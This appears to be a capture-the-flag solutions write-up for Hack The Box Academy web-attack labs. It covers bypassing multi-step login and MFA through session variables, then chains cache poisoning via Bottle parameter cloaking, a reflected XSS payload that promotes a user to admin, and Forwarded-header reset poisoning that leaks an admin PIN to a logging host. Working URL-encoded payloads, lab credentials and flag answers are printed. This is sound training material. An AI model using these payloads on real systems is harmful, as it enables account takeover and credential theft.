Students are not to confirm the registration in phase 3, as the phase session variable would be populated with 3 instead of the desired value 2 for the `Forgot Password?` process:

![[HTB Solutions/CWEE/z. images/0587f7eb5502182b8ca8cfc94671cdfd_MD5.jpg]]

Now that phase 2 has been completed, students need to go back to the tab that has the `Forgot Password` tab/process open and navigate to `/reset_3.php`, allowing them to reset the password of `admin`:

![[HTB Solutions/CWEE/z. images/9680dac8637574dd56b5c3a842719d98_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/af0d7f41ed56f8070c22e0111a5dbb91_MD5.jpg]]

It is always a good operations security practice to use a cryptographically secure password to prevent other threat agents from gaining access, to generate one, students can use `openssl`:

Code: shell

```shell
openssl rand -hex 16
```

```
┌─[us-academy-2]─[10.10.14.212]─[htb-ac413848@htb-jwoqm0cp34]─[~]
└──╼ [★]$ openssl rand -hex 16

180cb421c0312c5e8f7b55829d7c3874
```

![[HTB Solutions/CWEE/z. images/cdc8d7868ded87982800ee9489696f3c_MD5.jpg]]

After resetting the password, students need to sign in as the `admin`:

![[HTB Solutions/CWEE/z. images/dbf8c2b0ea06f04c79f0a261208670be_MD5.jpg]]

Subsequently, students will be faced with phase 2 of the login process, which requires an MFA token. If in here students attempt to navigate to `/profile.php` directly, it will fail, as phase 2 of the login process also needs to be bypassed:

![[HTB Solutions/CWEE/z. images/0630b4745d65547c542bce45aa02f9f0_MD5.jpg]]

To bypass phase 2 of the login process, students need to exploit a common session variables vulnerability/misconfiguration. To do so, students need to navigate to `/register_1.php` and supply arbitrary/dummy information then click on `Register`:

![[HTB Solutions/CWEE/z. images/09a60e2318426b2165dafbcc17af1d6c_MD5.jpg]]

Subsequently, students also need to complete phase 2 by supplying dummy data:

![[HTB Solutions/CWEE/z. images/b88fa571644a7e0bef95b445b2b7c7b3_MD5.jpg]]

Now, the phase session variable will be holding the value 2, which is the desired value to bypass phase 2 of the login process (students are not to complete phase 3 of the registration process):

![[HTB Solutions/CWEE/z. images/766609808b13fd8a022a102bbdc0ac0b_MD5.jpg]]

At last, students need to change the URL to navigate to `/profile.php`, bypassing phase 2 of the login process and signing in as `admin`, attaining the flag `HTB{ad5ff3838cfce1e2476e18bc8562c6ba}`:

![[HTB Solutions/CWEE/z. images/d272c367380fb6f24bd7a89c48ef3ed7_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/9409b1124f4769691c32732ddbc6f7d3_MD5.jpg]]

Answer: `HTB{ad5ff3838cfce1e2476e18bc8562c6ba}`

# Skills Assessment - Easy

## Question 1

### "Exploit the vulnerable web application and submit the flag."

After spawning the target machine, students first need to log in with the credentials: `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/39c1d8e0e63f1799f834ec325a06d41a_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/ef9fa1af4501849c0c532807688b9975_MD5.jpg]]

Subsequently, students need to change the URL to `/reset_1.php`, supply the username `admin`, then click on `Submit`:

![[HTB Solutions/CWEE/z. images/f862e8312cfe1f93761e130d1e2284c1_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/c41d40f9c5290b66afe809fcb7dd5fc5_MD5.jpg]]

Students are not to complete phase 2; instead, they need to navigate to `/admin_users.php`, in an attempt to exploit premature session value population, attaining the flag `HTB{2667bd49fe5ba0efbff46ec060411822}`:

![[HTB Solutions/CWEE/z. images/6c1c64e0c7ea60ef448cd119dd83afd0_MD5.jpg]]

Answer: `HTB{2667bd49fe5ba0efbff46ec060411822}`

# Skills Assessment - Hard

## Question 1

### "Exploit the vulnerable web application and submit the flag. NOTE: The lab may take a couple of minutes to start up. Use the local vhost interactsh.local to exfiltrate data (refer to the Password Reset Poisoning section for more details). The cache expires after 2 minutes, so if you accidentally cached an incorrect payload, wait for 2 minutes until the cache expires."

After spawning the target machine, students first need to add the vHost entries `httpattacks.htb` and `interactsh.local` to `/etc/hosts`:

Code: shell

```shell
sudo sh -c 'echo "STMIP httpattacks.htb interactsh.local">> /etc/hosts'
```

```
┌─[us-academy-2]─[10.10.15.106]─[htb-ac413848@htb-xib16qpksl]─[~]
└──╼ [★]$ sudo sh -c 'echo "165.227.235.85 httpattacks.htb interactsh.local">> /etc/hosts'
```

Subsequently, students need to visit the web application of the spawned target machine and click on `Backend Portal`, to login with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/f948c563d9c04713d0916cc7a82e4b39_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/711a594ed2ed6af33badfb1c3fe2e75f_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/aa66030c9c731ef89cbc018b7ed27fe7_MD5.jpg]]

Once logged in, students need to start intel gathering to understand the web application better and discover/identify attack vectors to exploit. The first important (specific) information to acquire is determining the web framework used to build the web application; when inspecting the response of the request to `/admin/index.html`, students will notice that the custom header `X-Powered-By` exposes the framework to be `Python` [Bottle](https://bottlepy.org/docs/0.12/index.html), with its version being `0.12.18`:

![[HTB Solutions/CWEE/z. images/1397488c6cb839fcd21f170426ec2f39_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/93a3bc59e3e05224fa6bd2536f1cfc1d_MD5.jpg]]

Therefore, knowing that it is `Bottle`, students need to remember [CVE-2020-28473](https://nvd.nist.gov/vuln/detail/CVE-2020-28473) (since the web application is utilizing a version before `0.12.19`) and use the `parameter cloaking` technique when attempting to poison the cache.

Additionally, students need to notice that the response contains the custom header `X-Cache-Status`, with the `MISS` value. When sending the request again, the value becomes `HIT`:

![[HTB Solutions/CWEE/z. images/feb590e66cb0451b0a05dcbd1b71abf7_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a0c4b7ce73b227c8f0123fb90c77876f_MD5.jpg]]

However, when using a different value (i.e., a `Cache Buster`) for the parameter `utm_source`, the value remains `HIT`. Thus, `utm_source` is an unkeyed parameter; this is important to know for later when exploiting `parameter cloaking`, as an unkeyed parameter is required for successful exploitation in `Bottle`:

![[HTB Solutions/CWEE/z. images/1cddf43930702e2189d56394a594ecfb_MD5.jpg]]

Moreover, when navigating to the "Users" section, students will come to know that the admin visits the link `httpattacks.htb:STMPO/admin/users.html?sort_by=role` frequently, which is also important to know, as if the web application suffers from cache poisoning via `parameter cloaking`, then it would be very beneficial if the URL-parameter `sort_by=role` suffers from a `reflective XSS`, which will allow poisoning the cache and forcing the `admin` into making `htb-stdnt` become an `admin`:

![[HTB Solutions/CWEE/z. images/f7ee3f53d23e15cbe21efb8e2c4f6f9a_MD5.jpg]]

To make `htb-stdnt` become an `admin`, the `admin` frequently visiting the webpage must be coerced into clicking the link `httpattacks.htb:STMPO/admin/promote?uid2` (as this is only authorized to be performed by the `admin`):

![[HTB Solutions/CWEE/z. images/d86aab4eae2bde87db693f5bb3bda5d2_MD5.jpg]]

Students need to test if `sort_by` suffers from a `reflective XSS` by scrutinizing how its value is used and if any validation is performed on it:

![[HTB Solutions/CWEE/z. images/cf83ca0baf06da0882751dca03db9364_MD5.jpg]]

Since the value of `X-Cache-Status` is `MISS` every time a unique value of `sort_by` is used, it is a keyed parameter; additionally, students will notice that the value is used as the argument for the function `sort_table_by`. Students can inject `JavaScript` code after having a closing double-quotes and parenthesis, then ending the first `<script>` tag, including a starting `<script>` tag, the code to be injected followed by a semi-colon, then an arbitrary string followed by an equal sign and opening parenthesis ended with double-quotes (identifying the correct payload requires students to do extensive trial and error, inspecting the response each time when trying a new payload, until a valid `JavaScript` payload with a valid syntax has been attained):

Code: javascript

```javascript
doesNotMatter")</script><script>alert("XSS Success");doesNotMatter=("
```

Students need to URL-encode the payload, making sure all special characters are encoded also:

Code: javascript

```javascript
doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Ealert%28%22XSS%20Success%22%29%3BdoesNotMatter%3D%28%22
```

```http
GET /admin/users.html?sort_by=doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Ealert%28%22XSS%20Success%22%29%3BdoesNotMatter%3D%28%22 HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/1379e05bc91d5c2e59ae789d96ec9737_MD5.jpg]]

After confirming that the payload is injected correctly, students need to combine all previously gathered intel to poison the cache for the `admin` user utilizing `parameter cloaking`, in addition to knowing that `utm_source` is unkeyed while `sort_by` is keyed (students need to make sure that this is a cache `MISS` the first time it is sent, if not, they need to wait for 2 minutes until the cache expires):

```javascript
sort_by=role&utm_source=index.html;sort_by=doesNotMatter")</script><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin/promote?uid=2', true);xhr.withCredentials = true;xhr.send();doesNotMatter=("
```

Students need to URL-encode the payload, making sure all special characters are encoded also:

```javascript
sort_by=role&utm_source=index.html;sort_by=doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr%2Eopen%28%27GET%27%2C%20%27%2Fadmin%2Fpromote%3Fuid%3D2%27%2C%20true%29%3Bxhr%2EwithCredentials%20%3D%20true%3Bxhr%2Esend%28%29%3BdoesNotMatter%3D%28%22
```
```http
GET /admin/users.html?sort_by=role&utm_source=index.html;sort_by=doesNotMatter%22%29%3C%2Fscript%3E%3Cscript%3Evar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3Bxhr%2Eopen%28%27GET%27%2C%20%27%2Fadmin%2Fpromote%3Fuid%3D2%27%2C%20true%29%3Bxhr%2EwithCredentials%20%3D%20true%3Bxhr%2Esend%28%29%3BdoesNotMatter%3D%28%22 HTTP/1.1
```

![[HTB Solutions/CWEE/z. images/650a4ff8040bb97e88a875a8d777724a_MD5.jpg]]

After waiting for a few seconds, students will notice that the admin has triggered the XSS payload, therefore, making `htb-stdnt` an `admin` user:

![[HTB Solutions/CWEE/z. images/2411dadf9d3047cfe59a03c24f68ea71_MD5.jpg]]

Therefore, students will be able to access `/admin/sysinfo`:

![[HTB Solutions/CWEE/z. images/cf673300e64507e7aaa206f3c3116621_MD5.jpg]]

However, students will notice that the webpage instructs admins to access the site `httpattacks:STMPO/admin/sysinfo?refresh=1`, in addition requiring a PIN to access the admin panel:

![[HTB Solutions/CWEE/z. images/7d24a86851b617f10f7f7d6b81193704_MD5.jpg]]

Students need to click on the link and intercept the request with `Burp Suite`. Since the `admin` is submitting the PIN in the same page, students need to check the form action and see if it can be used to perform `Password Reset Poisoning` by manipulating the `Host` header value, and whether the web application constructs hard-links based on its value:

![[HTB Solutions/CWEE/z. images/bb625c9c8a6aabfc21fee2d79bf530e0_MD5.jpg]]

The web application does use the `Host` header to construct hard-links, however, when checking the log over `http://interactsh.local:STMPO/log`, students will notice that no PIN is received. Instead, students need to use the `Forwarded` `Override Header` and have its value to be `interactsh.local`:

![[HTB Solutions/CWEE/z. images/f5b24b6b398767aaf5577450e8d52085_MD5.jpg]]

After waiting for few seconds, students will notice that the `admin` has submitted the PIN `926402795027`:

![[HTB Solutions/CWEE/z. images/b84a454c743e9dc799dd94bc2f06ef44_MD5.jpg]]

Thus, students need to use the PIN `926402795027` to access the admin panel:

![[HTB Solutions/CWEE/z. images/9dddb2e34d3db57dace83501b520245d_MD5.jpg]]

At last, students need to click on `Open Modal` to attain the flag `HTB{28b4584a8f1bb666d8e5a9250b535977}`:

![[HTB Solutions/CWEE/z. images/568c293302a491481d02af0e877035c6_MD5.jpg]]

Answer: `HTB{28b4584a8f1bb666d8e5a9250b535977}`